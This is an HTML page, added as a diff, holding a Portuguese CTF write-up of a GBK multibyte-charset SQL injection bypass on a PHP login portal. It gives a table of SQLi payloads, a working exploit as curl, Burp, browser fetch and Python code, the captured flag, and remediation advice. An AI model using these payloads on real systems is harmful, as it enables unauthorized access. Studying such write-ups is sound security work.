@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>SQLi com bypass de charset GBK — writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,700;1,400&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --bg: #040505;
+            --fg: #ffffff;
+            --g: #ffffff;
+            --dim: #ffffff;
+            --red: #ffffff;
+            --amber: #ffffff;
+            --cyan: #ffffff;
+            --blue: #ffffff;
+            --mag: #ffffff
+        }
+
+        * {
+            box-sizing: border-box
+        }
+
+        html {
+            background: var(--bg)
+        }
+
+        body {
+            margin: 0;
+            min-height: 100vh;
+            color: var(--fg);
+            background: radial-gradient(ellipse 80% 55% at 50% 0%, #0d0d0d, var(--bg) 70%);
+            font: 15px/1.65 "JetBrains Mono", "Fira Code", "Cascadia Mono", Menlo, Consolas, monospace
+        }
+
+        body::before {
+            content: "";
+            position: fixed;
+            inset: 0;
+            z-index: 40;
+            pointer-events: none;
+            background: repeating-linear-gradient(0deg, rgba(0, 0, 0, .18) 0 1px, transparent 1px 3px),
+                radial-gradient(ellipse at center, transparent 55%, rgba(0, 0, 0, .6) 100%)
+        }
+
+        ::selection {
+            background: var(--g);
+            color: #000
+        }
+
+        .wrap {
+            position: relative;
+            z-index: 1;
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 28px 18px 90px;
+            text-shadow: 0 0 4px rgba(61, 255, 122, .15)
+        }
+
+        a {
+            color: var(--cyan)
+        }
+
+        a:hover {
+            background: var(--cyan);
+            color: #000
+        }
+
+        nav {
+            margin-bottom: 24px;
+            font-size: 14px
+        }
+
+        .kicker {
+            margin: 0 0 6px;
+            color: var(--dim);
+            font-size: 13px
+        }
+
+        h1 {
+            margin: 0 0 10px;
+            color: #fff;
+            font-size: clamp(20px, 4vw, 30px);
+            line-height: 1.25
+        }
+
+        .tags {
+            margin: 0 0 26px;
+            color: var(--cyan);
+            font-size: 13px
+        }
+
+        h2 {
+            margin: 38px 0 10px;
+            padding-bottom: 6px;
+            color: var(--g);
+            font-size: 17px;
+            border-bottom: 1px dashed #14502b
+        }
+
+        h3 {
+            margin: 26px 0 8px;
+            color: var(--amber);
+            font-size: 15px
+        }
+
+        p {
+            margin: 0 0 12px
+        }
+
+        ul,
+        ol {
+            margin: 0 0 14px;
+            padding-left: 22px
+        }
+
+        li {
+            margin: 4px 0
+        }
+
+        code {
+            color: var(--amber)
+        }
+
+        pre {
+            margin: 0 0 16px;
+            padding: 14px 16px;
+            overflow-x: auto;
+            background: #07120b;
+            border: 1px solid #14502b;
+            font: 13px/1.55 inherit;
+            color: var(--fg);
+            text-shadow: none
+        }
+
+        pre code {
+            color: var(--fg)
+        }
+
+        .flag {
+            color: var(--g);
+            font-weight: 700;
+            border-color: var(--g);
+            text-shadow: 0 0 10px rgba(61, 255, 122, .5)
+        }
+
+        table {
+            width: 100%;
+            margin: 8px 0 18px;
+            border-collapse: collapse;
+            font-size: 13px
+        }
+
+        th,
+        td {
+            padding: 6px 8px;
+            border: 1px solid #14502b;
+            text-align: left;
+            vertical-align: top
+        }
+
+        th {
+            background: #07120b;
+            color: var(--g)
+        }
+
+        .dim {
+            color: var(--dim)
+        }
+
+        .note {
+            margin: 14px 0;
+            padding: 8px 12px;
+            background: #100d06;
+            border-left: 2px solid var(--amber);
+            color: var(--dim)
+        }
+    </style>
+</head>
+
+<body>
+    <main class="wrap">
+        <nav><a href="../index.html#ctf's/PINK+ CTF 2026">← ../index.html#ctf's/PINK+ CTF 2026</a></nav>
+
+        <header>
+            <p class="kicker">[ctf's] · PINK+ CTF 2026 · 2026-11-08 · web / sqli</p>
+            <h1>SQLi com bypass de charset GBK — PINK+ Access Portal</h1>
+            <p class="tags">#sqli #web #php #gbk #charset #bypass</p>
+            <p class="dim">Evento: <a href="https://ctftime.org/event/3331" target="_blank"
+                    rel="noopener">PINK+ CTF 2026</a> · <a href="https://ctf.pink.bayern/" target="_blank"
+                    rel="noopener">ctf.pink.bayern</a></p>
+        </header>
+
+        <section>
+            <h2>TL;DR</h2>
+            <p>O portal de login era vulnerável a SQL Injection, mas as aspas eram escapadas por
+                <code>addslashes</code>/<code>mysql_real_escape_string</code>. O bypass veio de um problema de charset
+                multibyte (<strong>GBK</strong>): o byte <code>0xBF</code> seguido da barra invertida <code>0x5C</code>
+                inserida pelo escape forma um caractere GBK válido, "engolindo" o backslash e liberando a aspa
+                <code>0x27</code> para fechar a string.
+            </p>
+            <p>Payload (bytes crus no campo <code>username</code>):</p>
+            <pre><code>%bf%27 OR 1=1-- -</code></pre>
+            <p>Resposta:</p>
+            <pre><code>Authentication successful
+Access granted: PINK{0x5C_is_not_always_a_backslash}</code></pre>
+        </section>
+
+        <section>
+            <h2>1. Reconhecimento</h2>
+            <p>O alvo era um portal de login ("PINK+ Access Portal") com um formulário <code>POST /</code> contendo os
+                campos <code>username</code> e <code>password</code>. A página informava o alvo:</p>
+            <pre><code>TARGET ACCOUNT
+Username: flag
+Password: Unknown</code></pre>
+            <p>Observações iniciais:</p>
+            <ul>
+                <li>Stack: <code>Apache/2.4.69 (Debian)</code> com PHP (<code>index.php</code>), atrás de
+                    <code>Caddy</code> (header <code>Via: 1.1 Caddy</code>).</li>
+                <li><code>assets/app.js</code> apenas alterna a visibilidade da senha — irrelevante para a falha.</li>
+                <li>Nenhum cookie de sessão, nenhum token CSRF.</li>
+                <li>Enumeração de diretórios: somente <code>/index.php</code> e <code>/assets/</code> existiam. Sem
+                    backups, <code>.git</code>, <code>.env</code> ou painel alternativo.</li>
+                <li>Virtual hosts respondiam diferente conforme o header <code>Host</code> (<code>pink.bayern</code> →
+                    site da equipe, <code>ctf.pink.bayern</code> → plataforma CTFd), mas nada adicional para o desafio.
+                </li>
+            </ul>
+            <p>O formulário sempre renderizava o mesmo bloco de resultado em caso de falha:</p>
+            <pre><code>&lt;div class="result" role="alert" aria-live="polite"&gt;
+  &lt;strong&gt;Authentication failed&lt;/strong&gt;
+  &lt;p&gt;Access denied&lt;/p&gt;
+&lt;/div&gt;</code></pre>
+        </section>
+
+        <section>
+            <h2>2. Testes que falharam</h2>
+
+            <h3>2.1 Bypass clássico de autenticação</h3>
+            <p>Todos retornaram exatamente a mesma resposta:</p>
+            <table>
+                <thead>
+                    <tr><th>Payload (username)</th><th>Resultado</th></tr>
+                </thead>
+                <tbody>
+                    <tr><td><code>flag' OR '1'='1</code></td><td>falhou</td></tr>
+                    <tr><td><code>flag' OR 1=1-- -</code></td><td>falhou</td></tr>
+                    <tr><td><code>flag' OR 1=1#</code></td><td>falhou</td></tr>
+                    <tr><td><code>flag'||'1'='1</code></td><td>falhou</td></tr>
+                    <tr><td><code>flag'/**/OR/**/1=1-- -</code></td><td>falhou</td></tr>
+                    <tr><td><code>' OR '1'='1'-- -</code></td><td>falhou</td></tr>
+                    <tr><td><code>flag' OR 1=1 LIMIT 1-- -</code></td><td>falhou</td></tr>
+                    <tr><td><code>flag') OR 1=1-- -</code></td><td>falhou</td></tr>
+                    <tr><td><code>flag" OR "1"="1</code></td><td>falhou</td></tr>
+                    <tr><td><code>flag` OR 1=1-- -</code></td><td>falhou</td></tr>
+                    <tr><td><code>0 OR 1=1-- -</code></td><td>falhou</td></tr>
+                </tbody>
+            </table>
+            <p>Também foram testados payloads no campo <code>password</code> (com <code>username=flag</code>), incluindo
+                <code>' OR 1=1-- -</code>, <code>x') OR 1=1-- -</code>, <code>x") OR 1=1-- -</code> e
+                <code>x'||'1'='1</code> — todos falharam.
+            </p>
+
+            <h3>2.2 UNION / ORDER BY</h3>
+            <ul>
+                <li><code>UNION SELECT</code> com 1 a 7 colunas (valores <code>1</code> e <code>'x'</code>), inclusive
+                    com hashes conhecidos (<code>md5</code>, <code>sha1</code>, <code>sha256</code>, <code>sha512</code>
+                    e <strong>bcrypt</strong> gerado localmente) para o caso de a senha ser comparada via
+                    <code>password_verify</code>.
+                </li>
+                <li><code>ORDER BY 1..7</code>.</li>
+                <li>Nenhuma variação alterou a resposta.</li>
+            </ul>
+
+            <h3>2.3 Error-based</h3>
+            <ul>
+                <li>MySQL: <code>extractvalue()</code>, <code>updatexml()</code>, <code>FLOOR(RAND(0)*2)</code>.</li>
+                <li>PostgreSQL/MSSQL: <code>CAST(... AS int)</code>, <code>WAITFOR DELAY</code>.</li>
+                <li>Nenhum erro SQL foi exibido (o app suprime erros e sempre mostra a mesma mensagem).</li>
+            </ul>
+
+            <h3>2.4 Time-based</h3>
+            <ul>
+                <li>MySQL: <code>SLEEP(10)</code>, <code>BENCHMARK(100000000,MD5('a'))</code></li>
+                <li>PostgreSQL: <code>pg_sleep(10)</code></li>
+                <li>Mediana de tempo com payload ≈ mediana do controle (≈ 2 s, ruído de rede). <strong>Nenhum
+                        atraso</strong>, indicando que o payload não estava sendo executado como SQL — estava preso
+                    dentro de uma string literal.</li>
+            </ul>
+
+            <h3>2.5 Outras hipóteses</h3>
+            <ul>
+                <li>HPP (parâmetros duplicados), array params (<code>username[]</code>, <code>password[]</code>)</li>
+                <li>Injeção via <code>Cookie</code>, <code>X-Forwarded-For</code>, <code>User-Agent</code></li>
+                <li>Injeção via GET, JSON body, parâmetros extras (<code>debug</code>, <code>id</code>,
+                    <code>action</code>, etc.)</li>
+                <li>Fuzzing de ~130 caminhos e ~60 nomes de parâmetros</li>
+                <li>Senhas comuns (<code>flag</code>, <code>admin</code>, <code>password</code>, <code>pink</code>,
+                    etc.)</li>
+                <li>Wildcards (<code>%</code>, <code>_</code>) no campo de senha</li>
+                <li>Caracteres nulos, newline, trailing space, variação de caixa</li>
+            </ul>
+            <p>Nenhuma dessas abordagens produziu diferença de status, tamanho, cookies ou mensagem.</p>
+        </section>
+
+        <section>
+            <h2>3. Dificuldades encontradas</h2>
+            <ol>
+                <li><strong>Mensagem de erro genérica:</strong> o app sempre retornava "Authentication failed / Access
+                    denied", tanto para credencial errada quanto para erro de sintaxe SQL. Isso impossibilitou
+                    error-based e boolean-based tradicionais.</li>
+                <li><strong>Escaping eficaz das aspas:</strong> os testes de tempo provaram que o input era escapado
+                    antes de entrar na query (<code>addslashes</code>/<code>mysql_real_escape_string</code>),
+                    neutralizando todos os payloads clássicos.</li>
+                <li><strong>Ruído de rede:</strong> a latência do servidor variava entre ~1,5 s e ~5 s, tornando testes
+                    de tempo inconclusivos isoladamente — foi necessário usar múltiplas amostras e medianas.</li>
+                <li><strong>Sem superfície adicional:</strong> não havia outras rotas, backups, source leak ou
+                    parâmetros ocultos; todo o desafio estava concentrado no formulário de login.</li>
+                <li><strong>Falso positivo de comprimento:</strong> o tamanho da página oscilava entre 3903 e 3909 bytes
+                    sem relação com o input (variação do próprio servidor), o que gerou confusão momentânea.</li>
+            </ol>
+        </section>
+
+        <section>
+            <h2>4. O insight: charset multibyte (GBK)</h2>
+            <p>A aplicação escapava aspas com uma função estilo <code>addslashes</code>, mas a conexão com o banco usava
+                um <strong>charset multibyte (GBK)</strong>. No GBK, o byte <code>0xBF</code> é o primeiro byte de um
+                caractere de dois bytes, e o byte <code>0x5C</code> (barra invertida) pode ser o segundo byte.</p>
+            <p>Fluxo do bypass:</p>
+            <ol>
+                <li>Enviamos o username como bytes crus: <code>0xBF 0x27</code> seguido de <code> OR 1=1-- -</code>.</li>
+                <li>O escape vê a aspa <code>0x27</code> e insere <code>0x5C</code> antes dela:
+                    <code>0xBF 0x5C 0x27 OR 1=1-- -</code>
+                </li>
+                <li>O banco, interpretando GBK, lê <code>0xBF 0x5C</code> como <strong>um único caractere válido</strong>.
+                    O backslash de escape é consumido.</li>
+                <li>A aspa <code>0x27</code> seguinte <strong>não está escapada</strong> e fecha a string.</li>
+                <li>A query resultante fica logicamente:</li>
+            </ol>
+            <pre><code>SELECT * FROM users WHERE username='縗' OR 1=1-- -' AND password='x'</code></pre>
+            <p>O <code>OR 1=1</code> torna a condição verdadeira e o <code>-- -</code> comenta o resto (inclusive a
+                checagem de senha).</p>
+        </section>
+
+        <section>
+            <h2>5. Exploit</h2>
+            <p>O <code>%bf</code> deve ser enviado como <strong>byte cru</strong>, não como UTF-8 (<code>%C2%BF</code>
+                não funciona). Além disso, não se pode colar <code>%bf%27</code> no formulário do navegador: o navegador
+                codifica o <code>%</code> e envia <code>%25bf%2527</code>.</p>
+
+            <h3>curl</h3>
+            <pre><code>curl -s -X POST "https://sqli.pink.bayern/" \
+  --data-binary "username=%bf%27 OR 1=1-- -&amp;password=x"</code></pre>
+            <div class="note">Use <code>--data-binary</code>, <strong>nunca</strong> <code>--data-urlencode</code> (ele
+                recodifica o <code>%</code>).</div>
+
+            <h3>Burp Suite (Repeater)</h3>
+            <pre><code>POST / HTTP/1.1
+Host: sqli.pink.bayern
+Content-Type: application/x-www-form-urlencoded
+
+username=%bf%27 OR 1=1-- -&amp;password=x</code></pre>
+
+            <h3>Console do navegador</h3>
+            <pre><code>fetch("/", {
+  method: "POST",
+  headers: { "Content-Type": "application/x-www-form-urlencoded" },
+  body: "username=%bf%27 OR 1=1-- -&amp;password=x"
+}).then(r =&gt; r.text()).then(console.log);</code></pre>
+            <p>Não use <code>URLSearchParams</code> nem <code>encodeURIComponent</code>, senão o <code>%bf</code> vira
+                <code>%25bf</code>.
+            </p>
+
+            <h3>Python</h3>
+            <pre><code>import urllib.request
+
+body = b"username=%bf%27 OR 1=1-- -&amp;password=x"
+req = urllib.request.Request(
+    "https://sqli.pink.bayern/", data=body, method="POST"
+)
+print(urllib.request.urlopen(req).read().decode())</code></pre>
+
+            <h3>Resposta</h3>
+            <pre><code>&lt;div class="result success" role="alert" aria-live="polite"&gt;
+  &lt;strong&gt;Authentication successful&lt;/strong&gt;
+  &lt;p&gt;Access granted: PINK{0x5C_is_not_always_a_backslash}&lt;/p&gt;
+&lt;/div&gt;</code></pre>
+        </section>
+
+        <section>
+            <h2>6. Flag</h2>
+            <pre class="flag">PINK{0x5C_is_not_always_a_backslash}</pre>
+            <p>O próprio nome da flag confirma a técnica: <code>0x5C</code> é o backslash que foi "engolido" pelo
+                caractere GBK.</p>
+        </section>
+
+        <section>
+            <h2>7. Causa raiz</h2>
+            <ul>
+                <li>Uso de <strong>escape manual</strong> (<code>addslashes</code> /
+                    <code>mysql_real_escape_string</code>) em vez de <strong>prepared statements</strong>.</li>
+                <li><strong>Charset da conexão incompatível</strong> com o charset usado na validação/escape (GBK),
+                    tornando o escape contornável com bytes multibyte.</li>
+                <li>Mensagens de erro genéricas dificultaram a detecção, mas não impediram a exploração.</li>
+            </ul>
+        </section>
+
+        <section>
+            <h2>8. Correção recomendada</h2>
+            <ol>
+                <li><strong>Prepared statements com parâmetros vinculados</strong> (PDO ou <code>mysqli</code> com
+                    <code>bind_param</code>) — elimina a classe inteira de SQLi, independente de charset.</li>
+                <li>Se for inevitável escapar manualmente, definir o charset da conexão explicitamente
+                    <strong>antes</strong> do escape (ex.: <code>mysqli_set_charset($conn, 'utf8mb4')</code> ou
+                    <code>charset=utf8mb4</code> no DSN do PDO).</li>
+                <li>Nunca usar <code>addslashes</code> para SQL.</li>
+                <li>Não exibir detalhes internos na resposta de autenticação.</li>
+                <li>Aplicar o princípio do menor privilégio no usuário do banco.</li>
+            </ol>
+        </section>
+
+        <section>
+            <h2>9. Ferramentas utilizadas</h2>
+            <ul>
+                <li><code>curl.exe</code> para requisições manuais</li>
+                <li><strong>Python 3.14</strong> com <code>urllib</code> para automação de fuzzing, testes booleanos,
+                    UNION, time-based e envio de bytes crus</li>
+                <li>Módulo <code>bcrypt</code> (via <code>pip</code>) para testar a hipótese de
+                    <code>password_verify</code> com hashes bcrypt</li>
+                <li>Scripts próprios para enumeração de caminhos/parâmetros e comparação de respostas</li>
+            </ul>
+        </section>
+
+        <section>
+            <h2>10. Lições</h2>
+            <ul>
+                <li>Quando payloads clássicos falham e testes de tempo não disparam, o input provavelmente está
+                    escapado — mas <strong>escape não é suficiente</strong>: charset importa.</li>
+                <li><strong>Multibyte charset injection</strong> é um bypass clássico e ainda relevante (GBK, SJIS,
+                    BIG5).</li>
+                <li>Testar bytes crus (<code>--data-binary</code>) em vez de strings UTF-8 foi o ponto decisivo.</li>
+                <li>A flag foi projetada exatamente para premiar quem identificou o papel do byte <code>0x5C</code>.
+                </li>
+            </ul>
+            <p class="dim">Flag: PINK{0x5C_is_not_always_a_backslash}</p>
+        </section>
+    </main>
+</body>
+
+</html>
